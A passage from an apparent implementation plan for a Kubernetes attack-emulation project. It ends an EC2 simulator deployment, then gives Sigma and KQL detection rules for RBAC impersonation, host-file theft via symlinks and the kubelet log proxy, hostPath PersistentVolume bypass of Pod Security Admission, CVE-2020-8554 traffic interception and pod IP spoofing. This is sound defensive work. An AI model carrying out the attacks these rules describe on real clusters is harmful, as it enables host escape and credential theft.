            "Traffic flowing normally to legitimate pod IP"
        )
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
PYEOF

cat > /opt/app/Dockerfile << 'DKEOF'
FROM python:3.9-slim
RUN pip install flask
COPY app.py /app/app.py
CMD ["python", "/app/app.py"]
DKEOF

cd /opt/app
docker build -t k8s-stat .
docker run -d --name k8s-stat -p 8080:8080 --restart unless-stopped k8s-stat
"""

instance = aws.ec2.Instance(f"mayatrail-k8s-stat-ec2-{stack_name}", instance_type="t3.micro", ami=ami.id, subnet_id=subnet.id, vpc_security_group_ids=[sg.id], user_data=user_data, tags=TAGS)

pulumi.export("vuln_instance_ip", instance.public_ip)
```

- [ ] **Step 2: Commit**

```bash
git add emulations/k8s_pod_status_mitm/infra/__main__.py
git commit -m "feat: complete k8s_pod_status_mitm attack chain with traffic redirect verification"
```

---

### Task 6: Detection files for k8s_rbac_impersonation

**Files:**
- Create: `emulations/k8s_rbac_impersonation/detections/sigma_t1069.yml`
- Create: `emulations/k8s_rbac_impersonation/detections/kql_t1069.kql`
- Create: `emulations/k8s_rbac_impersonation/detections/sigma_t1548.yml`
- Create: `emulations/k8s_rbac_impersonation/detections/kql_t1548.kql`

- [ ] **Step 1: Create sigma_t1069.yml**

```yaml
title: Kubernetes RBAC Permission Enumeration via SelfSubjectRulesReviews
id: a1b2c3d4-1111-4aaa-b111-aaaaaaaaaaaa
status: experimental
description: |
  Detects creation of a SelfSubjectRulesReview resource, which allows a caller
  to inspect their own RBAC permissions without triggering wildcard discovery
  alarms. Attackers use this to confirm impersonate rights before escalating.
  Emulated by MayaTrail k8s_rbac_impersonation (Phase 1).
references:
  - https://attack.mitre.org/techniques/T1069/
  - https://kubernetes.io/docs/reference/access-authn-authz/authorization/#checking-api-access
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.discovery
  - attack.t1069
  - kubernetes
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    objectRef.resource: selfsubjectrulesreviews
    objectRef.apiGroup: authorization.k8s.io
  condition: selection
falsepositives:
  - kubectl auth can-i --list invocations from legitimate users
  - RBAC auditing tooling (e.g. rbac-lookup, kubectl-who-can)
level: medium
```

- [ ] **Step 2: Create kql_t1069.kql**

```kql
// k8s_rbac_impersonation — T1069: Permission Groups Discovery
// Detects SelfSubjectRulesReview creation used to enumerate a service account's
// own RBAC permissions prior to an impersonation attempt.
//
// References:
//   https://attack.mitre.org/techniques/T1069/
//   https://kubernetes.io/docs/reference/access-authn-authz/authorization/

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where tostring(log.verb) == "create"
| where tostring(log.objectRef.resource) == "selfsubjectrulesreviews"
| where tostring(log.objectRef.apiGroup) == "authorization.k8s.io"
| project
    TimeGenerated,
    CallerUser       = tostring(log.user.username),
    CallerGroups     = tostring(log.user.groups),
    SourceIP         = tostring(log.sourceIPs[0]),
    ResponseCode     = toint(log.responseStatus.code),
    AuditID          = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: SelfSubjectRulesReview — potential RBAC enumeration"
| order by TimeGenerated desc
```

- [ ] **Step 3: Create sigma_t1548.yml**

```yaml
title: Kubernetes API Request with User Impersonation Headers
id: b2c3d4e5-2222-4bbb-b222-bbbbbbbbbbbb
status: experimental
description: |
  Detects Kubernetes API requests where the caller uses the Impersonate-User
  or Impersonate-Group HTTP headers to assume a higher-privileged identity at
  request time. Unlike RoleBinding changes, impersonation leaves no RBAC
  configuration trace — the original caller is recorded only in the
  impersonatedUser field of the audit log.
  Emulated by MayaTrail k8s_rbac_impersonation (Phase 2).
references:
  - https://attack.mitre.org/techniques/T1548/
  - https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.privilege_escalation
  - attack.t1548
  - kubernetes
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    impersonatedUser.username|exists: true
    responseStatus.code:
      - 200
      - 201
  filter_system:
    impersonatedUser.username|startswith: 'system:'
  condition: selection and not filter_system
falsepositives:
  - Cluster operators legitimately using kubectl --as for administrative tasks
  - CI/CD systems that use service account impersonation for multi-tenant deployments
level: high
```

- [ ] **Step 4: Create kql_t1548.kql**

```kql
// k8s_rbac_impersonation — T1548: Abuse Elevation Control Mechanism
// Detects Kubernetes API requests that succeeded while using impersonation headers,
// where the impersonated identity is not a system: built-in account.
//
// References:
//   https://attack.mitre.org/techniques/T1548/
//   https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where isnotempty(tostring(log.impersonatedUser.username))
| where not (tostring(log.impersonatedUser.username) startswith "system:")
| where toint(log.responseStatus.code) in (200, 201)
| project
    TimeGenerated,
    OriginalCaller       = tostring(log.user.username),
    ImpersonatedUser     = tostring(log.impersonatedUser.username),
    ImpersonatedGroups   = tostring(log.impersonatedUser.groups),
    Verb                 = tostring(log.verb),
    Resource             = tostring(log.objectRef.resource),
    Namespace            = tostring(log.objectRef.namespace),
    SourceIP             = tostring(log.sourceIPs[0]),
    ResponseCode         = toint(log.responseStatus.code),
    AuditID              = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: Successful API call using impersonation headers — privilege escalation"
| order by TimeGenerated desc
```

- [ ] **Step 5: Commit**

```bash
git add emulations/k8s_rbac_impersonation/detections/
git commit -m "feat: add T1069 and T1548 detection rules for k8s_rbac_impersonation"
```

---

### Task 7: Detection files for k8s_writable_log_escape

**Files:**
- Create: `emulations/k8s_writable_log_escape/detections/sigma_t1609.yml`
- Create: `emulations/k8s_writable_log_escape/detections/kql_t1609.kql`
- Create: `emulations/k8s_writable_log_escape/detections/sigma_t1611.yml`
- Create: `emulations/k8s_writable_log_escape/detections/kql_t1611.kql`

- [ ] **Step 1: Create sigma_t1609.yml**

```yaml
title: Kubernetes Pod Exec — Container Administration Command
id: c3d4e5f6-3333-4ccc-b333-cccccccccccc
status: experimental
description: |
  Detects exec access into a running pod container via the Kubernetes API
  (pods/exec subresource). Attackers use pod exec to run commands inside
  a compromised container, such as creating symlinks in writable host-path
  mounts to set up host escape chains.
  Emulated by MayaTrail k8s_writable_log_escape (Phase 1).
references:
  - https://attack.mitre.org/techniques/T1609/
  - https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.execution
  - attack.t1609
  - kubernetes
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    objectRef.resource: pods
    objectRef.subresource: exec
  condition: selection
falsepositives:
  - Legitimate debugging sessions by cluster operators (kubectl exec)
  - CI/CD pipelines running smoke-test commands inside pods
level: medium
```

- [ ] **Step 2: Create kql_t1609.kql**

```kql
// k8s_writable_log_escape — T1609: Container Administration Command
// Detects use of pods/exec subresource, which allows running commands inside
// a container. An attacker exploiting a writable /var/log mount uses exec to
// create a symlink pointing to a sensitive host file before exfiltrating it
// via the Kubelet log proxy endpoint.
//
// References:
//   https://attack.mitre.org/techniques/T1609/

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where tostring(log.verb) == "create"
| where tostring(log.objectRef.resource) == "pods"
| where tostring(log.objectRef.subresource) == "exec"
| project
    TimeGenerated,
    CallerUser   = tostring(log.user.username),
    Namespace    = tostring(log.objectRef.namespace),
    PodName      = tostring(log.objectRef.name),
    SourceIP     = tostring(log.sourceIPs[0]),
    ResponseCode = toint(log.responseStatus.code),
    AuditID      = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: pods/exec — container command execution detected"
| order by TimeGenerated desc
```

- [ ] **Step 3: Create sigma_t1611.yml**

```yaml
title: Kubernetes Kubelet Log Proxy Access — Potential Host File Exfiltration
id: d4e5f6a7-4444-4ddd-b444-dddddddddddd
status: experimental
description: |
  Detects GET requests to the Kubernetes node proxy logs endpoint
  (/api/v1/nodes/{node}/proxy/logs). If a container has mounted the host
  /var/log directory and created a symlink to a sensitive file, a caller with
  get rights on the nodes/proxy subresource can read arbitrary host filesystem
  content through this endpoint.
  Emulated by MayaTrail k8s_writable_log_escape (Phase 2).
references:
  - https://attack.mitre.org/techniques/T1611/
  - https://sysdig.com/blog/how-to-detect-kubernetes-vulnerability-cve-2021-25741/
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.privilege_escalation
  - attack.t1611
  - kubernetes
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: get
    objectRef.resource: nodes
    objectRef.subresource: proxy
    requestURI|contains: '/proxy/logs'
  condition: selection
falsepositives:
  - Legitimate log collection agents that use the Kubelet log API
  - Cluster monitoring tools reading container stdout logs via node proxy
level: high
```

- [ ] **Step 4: Create kql_t1611.kql**

```kql
// k8s_writable_log_escape — T1611: Escape to Host
// Detects access to the Kubelet log proxy endpoint on a node. When a pod
// has mounted host /var/log and created a symlink to /etc/shadow or similar,
// this endpoint traverses the symlink and returns sensitive host file contents
// to any caller with nodes/proxy get rights.
//
// References:
//   https://attack.mitre.org/techniques/T1611/

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where tostring(log.verb) == "get"
| where tostring(log.objectRef.resource) == "nodes"
| where tostring(log.objectRef.subresource) == "proxy"
| where tostring(log.requestURI) contains "/proxy/logs"
| extend RequestedPath = extract(@"path=([^&]+)", 1, tostring(log.requestURI))
| project
    TimeGenerated,
    CallerUser    = tostring(log.user.username),
    TargetNode    = tostring(log.objectRef.name),
    RequestedPath,
    RequestURI    = tostring(log.requestURI),
    SourceIP      = tostring(log.sourceIPs[0]),
    ResponseCode  = toint(log.responseStatus.code),
    AuditID       = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: Kubelet log proxy access — potential host escape via symlink"
| order by TimeGenerated desc
```

- [ ] **Step 5: Commit**

```bash
git add emulations/k8s_writable_log_escape/detections/
git commit -m "feat: add T1609 and T1611 detection rules for k8s_writable_log_escape"
```

---

### Task 8: Detection files for k8s_pvc_psa_bypass

**Files:**
- Create: `emulations/k8s_pvc_psa_bypass/detections/sigma_t1211.yml`
- Create: `emulations/k8s_pvc_psa_bypass/detections/kql_t1211.kql`
- Create: `emulations/k8s_pvc_psa_bypass/detections/sigma_t1611.yml`
- Create: `emulations/k8s_pvc_psa_bypass/detections/kql_t1611.kql`

- [ ] **Step 1: Create sigma_t1211.yml**

```yaml
title: Kubernetes HostPath PersistentVolume Created — PSA Bypass Indicator
id: e5f6a7b8-5555-4eee-b555-eeeeeeeeeeee
status: experimental
description: |
  Detects creation of a PersistentVolume with a hostPath spec. Pod Security
  Admission (PSA) only inspects Pod specs at admission time and does not audit
  the PV/PVC storage provisioning layer. An attacker can create a PV pointing
  to a sensitive host path and later bind a pod to it, bypassing PSA baseline
  and restricted policies entirely.
  Emulated by MayaTrail k8s_pvc_psa_bypass (Phase 1).
references:
  - https://attack.mitre.org/techniques/T1211/
  - https://kubernetes.io/docs/concepts/security/pod-security-admission/
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.defense_evasion
  - attack.t1211
  - kubernetes
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    objectRef.resource: persistentvolumes
  condition: selection
falsepositives:
  - Legitimate cluster storage administrators provisioning storage
  - Static provisioners creating PVs for NFS, local, or CSI drivers
level: medium
```

- [ ] **Step 2: Create kql_t1211.kql**

```kql
// k8s_pvc_psa_bypass — T1211: Exploitation for Defense Evasion
// Detects creation of PersistentVolumes. In clusters relying on PSA,
// an attacker creates a PV with a hostPath spec to bypass pod-level
// security policies. Flag all PV creations for review, especially those
// where requestObject contains a hostPath field.
//
// References:
//   https://attack.mitre.org/techniques/T1211/

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where tostring(log.verb) == "create"
| where tostring(log.objectRef.resource) == "persistentvolumes"
| extend requestObj = parse_json(tostring(log.requestObject))
| extend HostPath = tostring(requestObj.spec.hostPath.path)
| project
    TimeGenerated,
    CallerUser   = tostring(log.user.username),
    PVName       = tostring(log.objectRef.name),
    HostPath,
    SourceIP     = tostring(log.sourceIPs[0]),
    ResponseCode = toint(log.responseStatus.code),
    AuditID      = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: PersistentVolume created — verify hostPath is not sensitive"
| order by TimeGenerated desc
```

- [ ] **Step 3: Create sigma_t1611.yml**

```yaml
title: Kubernetes Pod Mounting PVC Bound to HostPath Volume
id: f6a7b8c9-6666-4fff-b666-ffffffffffff
status: experimental
description: |
  Detects creation of pods that reference a PersistentVolumeClaim. When
  combined with a PV that uses a hostPath spec (T1211), the pod effectively
  mounts the host filesystem from an otherwise policy-compliant container,
  achieving host escape (T1611). Correlate with prior PV creation events.
  Emulated by MayaTrail k8s_pvc_psa_bypass (Phase 3).
references:
  - https://attack.mitre.org/techniques/T1611/
  - https://kubernetes.io/docs/concepts/storage/persistent-volumes/#hostpath
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.privilege_escalation
  - attack.t1611
  - kubernetes
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    objectRef.resource: pods
  filter_system_ns:
    objectRef.namespace:
      - 'kube-system'
      - 'kube-public'
  condition: selection and not filter_system_ns
falsepositives:
  - Normal application workloads scheduling pods that use PVCs for persistent storage
level: low
```

- [ ] **Step 4: Create kql_t1611.kql**

```kql
// k8s_pvc_psa_bypass — T1611: Escape to Host
// Detects pod creation outside system namespaces that references a PVC volume.
// When the bound PV uses a hostPath spec, this pod effectively mounts the host
// filesystem, achieving container escape despite PSA controls.
// Correlate with PersistentVolume creation (T1211) in the same session.
//
// References:
//   https://attack.mitre.org/techniques/T1611/

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where tostring(log.verb) == "create"
| where tostring(log.objectRef.resource) == "pods"
| where tostring(log.objectRef.namespace) !in ("kube-system", "kube-public")
| extend requestObj  = parse_json(tostring(log.requestObject))
| extend volumes     = requestObj.spec.volumes
| mv-expand Volume = volumes
| where isnotempty(Volume.persistentVolumeClaim.claimName)
| project
    TimeGenerated,
    CallerUser  = tostring(log.user.username),
    Namespace   = tostring(log.objectRef.namespace),
    PodName     = tostring(log.objectRef.name),
    PVCClaim    = tostring(Volume.persistentVolumeClaim.claimName),
    SourceIP    = tostring(log.sourceIPs[0]),
    ResponseCode = toint(log.responseStatus.code),
    AuditID     = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: Pod with PVC volume created — correlate with hostPath PV for escape chain"
| order by TimeGenerated desc
```

- [ ] **Step 5: Commit**

```bash
git add emulations/k8s_pvc_psa_bypass/detections/
git commit -m "feat: add T1211 and T1611 detection rules for k8s_pvc_psa_bypass"
```

---

### Task 9: Detection files for k8s_external_ips_mitm

**Files:**
- Create: `emulations/k8s_external_ips_mitm/detections/sigma_t1557.yml`
- Create: `emulations/k8s_external_ips_mitm/detections/kql_t1557.kql`

- [ ] **Step 1: Create sigma_t1557.yml**

```yaml
title: Kubernetes Service Created with ExternalIPs — CVE-2020-8554 Traffic Interception
id: a7b8c9d0-7777-4aaa-b777-777777777777
status: experimental
description: |
  Detects creation or update of a Kubernetes Service resource that includes a
  non-empty externalIPs list. An attacker can set externalIPs to any public IP
  address, causing kube-proxy to redirect cluster-internal traffic destined for
  that IP to the attacker's pod (CVE-2020-8554). This enables interception of
  DNS responses, database credentials, and API tokens flowing to external services.
  Emulated by MayaTrail k8s_external_ips_mitm (Phase 1).
references:
  - https://attack.mitre.org/techniques/T1557/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8554
  - https://kubernetes.io/docs/concepts/services-networking/service/#external-ips
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.credential_access
  - attack.collection
  - attack.t1557
  - kubernetes
  - cve-2020-8554
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb:
      - create
      - update
      - patch
    objectRef.resource: services
    requestObject.spec.externalIPs|exists: true
  condition: selection
falsepositives:
  - Clusters that legitimately use externalIPs for LoadBalancer services on bare-metal
  - MetalLB or similar controllers that assign externalIPs automatically
level: high
```

- [ ] **Step 2: Create kql_t1557.kql**

```kql
// k8s_external_ips_mitm — T1557: Adversary-in-the-Middle (CVE-2020-8554)
// Detects Services created or modified with a non-empty externalIPs field.
// kube-proxy programs iptables rules for each externalIP, redirecting matching
// traffic to the service's endpoints — allowing an attacker to intercept traffic
// to arbitrary public IPs from within the cluster network.
//
// References:
//   https://attack.mitre.org/techniques/T1557/
//   https://nvd.nist.gov/vuln/detail/CVE-2020-8554

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where tostring(log.verb) in ("create", "update", "patch")
| where tostring(log.objectRef.resource) == "services"
| extend requestObj   = parse_json(tostring(log.requestObject))
| extend ExternalIPs  = tostring(requestObj.spec.externalIPs)
| where isnotempty(ExternalIPs) and ExternalIPs != "[]"
| project
    TimeGenerated,
    CallerUser   = tostring(log.user.username),
    Namespace    = tostring(log.objectRef.namespace),
    ServiceName  = tostring(log.objectRef.name),
    ExternalIPs,
    Verb         = tostring(log.verb),
    SourceIP     = tostring(log.sourceIPs[0]),
    ResponseCode = toint(log.responseStatus.code),
    AuditID      = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: Service with externalIPs — potential CVE-2020-8554 traffic interception"
| order by TimeGenerated desc
```

- [ ] **Step 3: Commit**

```bash
git add emulations/k8s_external_ips_mitm/detections/
git commit -m "feat: add T1557 detection rules for k8s_external_ips_mitm"
```

---

### Task 10: Detection files for k8s_pod_status_mitm

**Files:**
- Create: `emulations/k8s_pod_status_mitm/detections/sigma_t1557.yml`
- Create: `emulations/k8s_pod_status_mitm/detections/kql_t1557.kql`

- [ ] **Step 1: Create sigma_t1557.yml**

```yaml
title: Kubernetes pods/status Subresource Patched — Pod IP Spoofing
id: b8c9d0e1-8888-4bbb-b888-888888888888
status: experimental
description: |
  Detects patch or update operations on the pods/status subresource. The status
  subresource controls the authoritative endpoint data for a pod, including its
  IP address. An attacker with patch rights on pods/status can change a pod's
  reported podIP to their own container's IP, causing service endpoint controllers
  to redirect traffic for the victim pod to the attacker.
  Emulated by MayaTrail k8s_pod_status_mitm (Phase 1).
references:
  - https://attack.mitre.org/techniques/T1557/
  - https://kubernetes.io/docs/reference/access-authn-authz/rbac/#referring-to-resources
author: MayaTrail Security Research
date: 2026/06/28
tags:
  - attack.credential_access
  - attack.collection
  - attack.t1557
  - kubernetes
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb:
      - patch
      - update
    objectRef.resource: pods
    objectRef.subresource: status
  filter_controllers:
    user.username|startswith:
      - 'system:node:'
      - 'system:serviceaccount:kube-system:'
  condition: selection and not filter_controllers
falsepositives:
  - Legitimate Kubernetes controllers (node controller, kubelet) updating pod status
  - Custom operators that manage pod lifecycle and write status updates
level: high
```

- [ ] **Step 2: Create kql_t1557.kql**

```kql
// k8s_pod_status_mitm — T1557: Adversary-in-the-Middle (podIP Spoofing)
// Detects patch/update operations on the pods/status subresource from callers
// that are not the kubelet (system:node:*) or kube-system service accounts.
// An attacker with this privilege can overwrite a pod's podIP field, diverting
// service endpoint traffic to their own container.
//
// References:
//   https://attack.mitre.org/techniques/T1557/

KubernetesAuditLogs
| where TimeGenerated > ago(1h)
| extend log = parse_json(AuditLog)
| where tostring(log.verb) in ("patch", "update")
| where tostring(log.objectRef.resource) == "pods"
| where tostring(log.objectRef.subresource) == "status"
| where not (tostring(log.user.username) startswith "system:node:")
| where not (tostring(log.user.username) startswith "system:serviceaccount:kube-system:")
| extend requestObj = parse_json(tostring(log.requestObject))
| extend NewPodIP   = tostring(requestObj.status.podIP)
| project
    TimeGenerated,
    CallerUser   = tostring(log.user.username),
    Namespace    = tostring(log.objectRef.namespace),
    PodName      = tostring(log.objectRef.name),
    NewPodIP,
    Verb         = tostring(log.verb),
    SourceIP     = tostring(log.sourceIPs[0]),
    ResponseCode = toint(log.responseStatus.code),
    AuditID      = tostring(log.auditID)
| extend AlertTitle = "Kubernetes: pods/status patched by non-system account — potential IP spoofing"
| order by TimeGenerated desc
```

- [ ] **Step 3: Commit**

```bash
git add emulations/k8s_pod_status_mitm/detections/
git commit -m "feat: add T1557 detection rules for k8s_pod_status_mitm"
```

---

## Self-Review

**Spec coverage:**
- ✅ `technique_count` fixes in rbac_impersonation and writable_log_escape (Task 1)
- ✅ `phase_count` fix + `attack_path` update + T1611 mapping in pvc_psa_bypass (Task 1)
- ✅ Health-check polling in all 5 attack.py files (Task 2)
- ✅ pvc_psa_bypass Phase 3 (pod create + host read) in infra + attack.py (Tasks 2 + 3)
- ✅ external_ips_mitm Phase 2 (traffic interception) in infra + attack.py (Tasks 2 + 4)
- ✅ pod_status_mitm Phase 2 (traffic verification) in infra + attack.py (Tasks 2 + 5)
- ✅ detections/ for all 5 emulations: Sigma + KQL (Tasks 6–10)

**Placeholder scan:** No TBDs or "similar to Task N" shorthand found.

**Type consistency:** All `attack.py` files use `run(outputs: dict, region: str = "us-east-1") -> None`. All infra files export `vuln_instance_ip`. `_wait_for_simulator` is defined in each file (not shared — avoids creating a cross-file dependency where none currently exists).

**One edge case noted:** Task 2 Step 3 and Step 4 (external_ips_mitm and pod_status_mitm attack.py files) also include the Phase 2 attack content, making them the final versions of those files. Tasks 4 and 5 only modify the *infra* files. This is correct — do not overwrite attack.py again in Tasks 4 and 5.
